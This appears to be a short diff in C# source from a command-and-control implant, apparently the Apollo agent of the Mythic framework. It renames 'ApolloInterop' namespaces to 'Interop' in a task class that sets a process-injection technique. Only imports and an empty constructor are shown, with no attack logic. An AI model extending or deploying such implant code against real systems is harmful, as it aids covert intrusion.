@@ -6,15 +6,15 @@
 
 #if SET_INJECTION_TECHNIQUE
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using Interop.Classes;
+using Interop.Interfaces;
+using Interop.Structs.MythicStructs;
 
 namespace Tasks
 {
     public class set_injection_technique : Tasking
     {
-        public set_injection_technique(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public set_injection_technique(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
